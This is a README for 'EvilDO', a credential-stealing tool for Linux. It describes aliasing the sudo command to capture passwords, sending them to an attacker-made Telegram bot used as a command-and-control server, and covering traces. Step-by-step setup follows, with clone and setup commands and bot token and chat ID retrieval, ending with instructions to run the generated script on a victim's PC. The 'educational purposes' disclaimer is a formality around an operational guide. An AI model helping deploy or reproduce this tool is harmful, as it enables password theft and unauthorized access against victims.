## EvilDO - Creditshifter for Linux systems
A tool that simply sets alias to sudo command, then sends captured passwords and information to Telegram bot(created by BotFather) and then covers up all the traces.

![](assets/screenshot.png)

### Features

- 

### Setup 

I am not responsible for any illegal activities commited using this tool. This tool is intended for educational purposes only. Use it at your own risk.

The setup process is actually quite easy, first thing we wanna do - is to copy this repo to our PC and launch the setup script, we can do it like this:

```bash
git clone https://github.com/noder-ss/evildo
cd evildo
bash setup.sh
```

Then, choose 1

![](assets/setup/1.png)

Here, you should make your own Telegram bot, it will be used as c&c server.
Open Teleram, search for BotFather. Then, create a bot using /newbot command. Give your bot name and username, username should be unique. 

![](assets/setup/2.jpg)

Then, you will recieve API token and link to the bot. Follow this link, start the bot and then write something to him.

![](assets/setup/3.png)

And now, follow this link: https://api.telegram.org/botTOKEN/getUpdates . Do not forget to replace TOKEN with your API token, that BotFather gave you. 
You will see output in JSON. Copy value of id as shown in the picture

![](assets/setup/4.png)

Next, we can return to our terminal. 
Choose 'y' to the next option, because we already have chat ID and API token.
Now, just write required data:

![](assets/setup/5.png) 

If everything is ok, you will recieve a test message

![](assets/setup/6.png)

Then, return to the terminal, it should create another script - 'evildo.sh'. You should execute it on victim's PC, and all the gathered information will be in your Telegram bot.
Happy hacking!

### Contacts

If you have any questions, ideas, features, collaborative proposals or if you've found a bug, you can find me [here](https://t.me/gentuxx)
